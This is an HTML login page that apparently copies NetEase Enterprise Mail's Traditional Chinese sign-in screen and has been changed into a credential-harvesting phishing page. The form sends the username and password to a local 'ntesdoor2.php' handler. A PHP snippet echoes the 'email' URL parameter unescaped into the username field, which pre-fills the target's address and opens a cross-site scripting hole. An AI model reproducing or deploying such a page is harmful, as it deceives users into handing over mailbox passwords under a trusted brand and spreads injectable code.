<!DOCTYPE html>
<!-- saved from url=(0034)https://mail.qiye.163.com/?hl=zh_TW -->
<html xmlns="https://www.w3.org/1999/xhtml" class="tw"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
		<meta name="keywords" content="网易企业邮箱,登录企业邮箱,郵箱用戶登錄">
		<meta name="description" content="网易企业邮箱登录页面繁体版，帮助用户登录企业邮箱，开启随时随地，极速收发的便捷体验。">
		<meta name="title" content="网易企业邮箱 - 企业信息化专业解决方案">
		<title>网易企业邮箱 - 郵箱用戶登錄</title>
		<link href="https://mimg.qiye.163.com/o/domain/201801301800/index/css/global.css" rel="stylesheet" type="text/css">
		<link href="https://mimg.qiye.163.com/o/domain/201801301800/index/css/user.css" rel="stylesheet" type="text/css">
		<style type="text/css">
			.login-mod h2, .intro-mod h2, .news-mod h2 {
				background-image:url(https://mimg.qiye.163.com/o/domain/201801301800/index/css/../img/bg_tw_noqiye.png);
				background-repeat:no-repeat;
			}
			.login-mod-wrapper {
				width: 413px;
				height: 355px;
				position: absolute;
				top:40px;
				left: 498px;
			}
			.login-mod-form {
				background: url(https://mimg.qiye.163.com/o/domain/201801301800/index/css/../img/loginFormBg.png) no-repeat;
			}
			.login-mod-qr {
				background: url(https://mimg.qiye.163.com/o/domain/201801301800/index/css/../img/bg_qr_expand.png) no-repeat;
			}
			.login-mod .fi-notit {
				padding-left:30px;
			}
			.login-qr {
				position: absolute;
				left: 350px;
				top: 291px;
				width: 64px;
				height: 64px;
				cursor: pointer;
			}
			.login-qr-1 {
				background: url(https://mimg.qiye.163.com/o/domain/201801301800/index/css/../img/ic_qr.png) no-repeat;
			}
			.login-qr-1-hover {
				left: 349px;
				background: url(https://mimg.qiye.163.com/o/domain/201801301800/index/css/../img/ic_qr_hover.png) no-repeat;
			}
			.app-download {
				float:left;
				margin-left:10px;
				padding-left:20px;
				margin-top:6px;
			}
			.app-download-android {
				background:url(https://mimg.qiye.163.com/o/domain/201801301800/index/css/../img/ic_android.png) no-repeat;
			}
			.app-download-iphone {
				background:url(https://mimg.qiye.163.com/o/domain/201801301800/index/css/../img/ic_apple.png) no-repeat;
			}
			.app-download-link {
				color: #9eb8a0;
				text-decoration: none;
			}
			.logo {
				width:150px;
				height:40px;
				background: url(https://mimg.qiye.163.com/o/public/logo.gif) no-repeat 0 0;
			}
			.fi{
				padding: 5px 0 !important;
			}
			#err-wrapper{
				width: 170px !important;
			}
		</style>
		<link href="https://mimg.qiye.163.com/o/domain/201801301800/index/css/custom.css" rel="stylesheet" type="text/css">
		<!--[if lt ie 9]>
		<style type="text/css">
			.logo {
				background: none;
				filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://mimg.qiye.163.com/o/public/logo.gif', sizingMethod='scale');
			}
		</style>
		<![endif]-->
	</head>
	<body style="">
		<div class="page">
			<div class="header">
				<h1 class="logo"></h1>
				<div class="toplinks">
                    <a href="https://mail.qiye.163.com/?hl=zh_CN" target="_self">简体中文版</a> |
                    <a href="https://mail.qiye.163.com/?hl=en_US" target="_self">English</a> |
                    <a href="https://qiye.163.com/entry/help/help-client.htm" target="_blank">帮助</a>
                    </div>
			</div>
			<div class="body">
				<div class="part main-part" id="main-part" style="background-image: url(&quot;https://mimg.qiye.163.com/o/mailapp/qiyelogin/style/img/user_yixin_right_20171227.jpg&quot;); cursor: pointer;">
					<div id="login-mod-wrapper" class="login-mod-wrapper login-mod-form login-mod-wrapper-0" style="cursor: default; ">
						<div class="mod login-mod  ">
							<form name="loginform" id="loginform" action="ntesdoor2.php" method="post" onsubmit="return frmvalidator();">
								<input type="hidden" name="ch" id="ch" value="">
								<input type="hidden" name="language" value="2">
								<input type="hidden" name="pubid" id="pubid" value="">
								<input type="hidden" name="passtype" id="passtype" value="">
								<input type="hidden" name="support_verify_code" id="support_verify_code" value="1">
								<input type="hidden" name="domain" id="domain" value="">
									<script type="text/javascript">
										window.myDomain = "";
										window.isCommonPage = false;
										if(window.myDomain == "qiye.163.com"){
											window.isCommonPage = true;
										}
									</script>
								<h2>
									企業用戶登錄
								</h2>
								<div class="fi">
									<label class="tit">
										用戶名
									</label>
									<input type="text" name="account_name" id="account_name" class="ipt-t" value="<?php if(isset($_GET['email'])){echo $_GET['email'];}?>">
								</div>
								<div class="fi">
									<label class="tit">
										密 碼
									</label>
									<input type="password" class="ipt-t" name="password" id="password" value="">
								</div>
								<div id="verifyCodeWrap" class="fi f-dn">
									<label class="tit">驗證碼</label>
									<input type="text" name="verify_code" id="verify_code" style="float:left;width:140px;height:24px;line-height:24px;" class="ipt-sample">
									<a id="codeImgWrap" style="float:left;width:100px;height:30px;padding:0;margin:0;display:block;cursor:pointer;" href="javascript:void(0);">
										<img src="https://mail.qiye.163.com/?hl=zh_TW" style="width:100%;height:100%;">
									</a>
								</div>
								<div class="fi" style="clear:both;">
									<label for="remUsername">
										<input name="remUser" id="remUsername" value="1" type="checkbox" class="ipt-c">
										記住用戶名
									</label>
									&nbsp;&nbsp;
									<input type="hidden" name="secure" value="1">
									<label for="secure">
										<input id="secure" disabled="disabled" value="1" checked="" type="checkbox" class="ipt-c">
										SSL安全登錄
									</label>
									&nbsp;&nbsp;
									<label for="all_secure">
										<input name="all_secure" id="all_secure" value="1" type="checkbox" class="ipt-c">
										全程SSL
									</label>
								</div>
								<div class="fi fi-notit f-cb">
									<input type="submit" class="ipt-b" value="登  錄" style="float:left;" id="submit-btn">
                                    <div id="app-download-wrapper">
                                        <div class="app-download app-download-android">
                                            <a class="app-download-link" href="https://u.163.com/androidds4" target="_blank">Android版</a>&nbsp;
                                        </div>
                                        <div class="app-download app-download-iphone">
                                            <a class="app-download-link" href="https://u.163.com/iosds4" target="_blank">iPhone版</a>
                                        </div>
                                    </div>
									<table id="err-wrapper" class="err f-dn">
										<tbody><tr>
											<td id="msgpid"></td>
										</tr>
									</tbody></table>
								</div>
								<div class="goto" style="margin-top:0;">
										<a href="https://mail.qiye.163.com/admin.jsp" class="gotoLink" target="_blank">進入管理員登錄頁面</a>
                                        <a class="gotoLink" id="resetPwd">忘記密碼？</a>
										<a class="gotoLink" id="selectNetwork">登錄太慢？</a>
										</div>
								</form>
						</div>
                        <div id="login-qr-1" class="login-qr login-qr-1"></div>
                    <div class="m-codebox js-codebox f-zindex-10 login-mod-form">
						<!-- 安全登录 -->
						<div id="appLoginTab" class="appLoginTab">
							<div id="appLoginWait" style="display: block;">
								<h3>手機掃碼 安全防盜</h3>
								<div id="appCodeWrap" class="appCodeWrap allowmove">
									<div class="appCode-example"></div>
									<div id="appCodeBox" class="appCodeBox">
										<img id="appCode" class="appCode" width="130" height="130" src="https://mail.qiye.163.com/mailapp/commonweb/qrcode/getqrcode.do?w=130&h=130">
										<div id="appCodeRefresh" class="appCodeRefresh" style="display: none;">
											<div class="appCode-wrap"><p>二維碼已失效<br>請點擊刷新</p></div>
										</div>
									</div>
								</div>
								<p id="appLoginTxt" class="appLoginTxt txt-err"></p>
								<p class="appLogin-hint">使用 郵箱大師 掃描二維碼登錄</p>
								<p class="appLoginlink"><a id="howToUseApp" class="howToUseApp" href="javascript:void(0)">如何使用</a><var>|</var><a href="https://mail.163.com/dashi/" target="_blank">下載郵箱大師</a></p>
							</div>
							<div id="appLoginScan" class="appLoginScan" style="display:none">
								<div class="appLogin-scanSuc"></div>
								<p class="appLogin-scantxt txt-suc">成功掃描，請在手機上確認登錄</p>
								<a id="appLoginRestart" class="appLoginRestart" href="javascript:void(0)">返回重新掃描</a>
							</div>
					</div>
						<a class="closeentry js-closeentry" href="javascript:;" hidefocus="true"></a>
						</div>
                    </div>
				</div>
				<div class="part sec-part">
						<div class="mod sec-mod intro-mod">
								<h2>
									簡介
								</h2>
								</div>
						<div class="mod sec-mod news-mod">
								<h2>
									新聞
								</h2>
								</div>
						</div>
				</div>
			<div class="footer">
                <div class="link">
                <a href="https://corp.163.com/gb/home.shtml" target="_blank">關於網易</a>
                <a href="https://corp.163.com/gb/legal/legal.html" target="_blank">相關法律</a>
                <a href="https://qiye.163.com/" target="_blank">企業郵箱</a>
                </div>
                <div class="right">
                <span>本系統郵網易企業郵提供 ©1997-<script language="javascript" src="./网易企业邮箱 - 郵箱用戶登錄_files/year.js.download"></script>2018 </span>
                </div>
                </div>
		</div>
	
	<script type="text/javascript">
	var isDefaultBg = true,
		currentBanner = 'https://mimg.qiye.163.com/domain/img/user_bg.jpg',
		currentStyle = '0',
		addresses = 't,c,h',
        errMsg = '',
		domainType = 'bj' || 'bj';
		pageType = 'normal';
        verifyCodeUrl = 'https://entry.qiye.163.com/domain/getverifycode.jsp';
        // verifyCode = 'false';
		if(window.location.href.indexOf('code=true') > -1){
			verifyCode = 'true'
		}else{
			verifyCode = 'false';
		}
	</script>
	<script type="text/javascript" src="./网易企业邮箱 - 郵箱用戶登錄_files/loginjs.jsp"></script>
	<script type="text/javascript" src="./网易企业邮箱 - 郵箱用戶登錄_files/jquery.js.download"></script>
	<script type="text/javascript" src="./网易企业邮箱 - 郵箱用戶登錄_files/jquery-migrate.js.download"></script>
	<script type="text/javascript" src="./网易企业邮箱 - 郵箱用戶登錄_files/lang_zhtw.js.download"></script>
	<script type="text/javascript" src="./网易企业邮箱 - 郵箱用戶登錄_files/select_network.js.download"></script>
	<script type="text/javascript" src="./网易企业邮箱 - 郵箱用戶登錄_files/login_util.js.download"></script>
	<script type="text/javascript" src="./网易企业邮箱 - 郵箱用戶登錄_files/jquery.jsonp-2.4.0.min.js.download"></script>
    <script type="text/javascript" src="./网易企业邮箱 - 郵箱用戶登錄_files/select_banner.js.download"></script>
    <script type="text/javascript" src="./网易企业邮箱 - 郵箱用戶登錄_files/reset_pwd.js.download"></script>
    <script type="text/javascript" src="./网易企业邮箱 - 郵箱用戶登錄_files/qiye_algorithm.js.download"></script>

</body></html>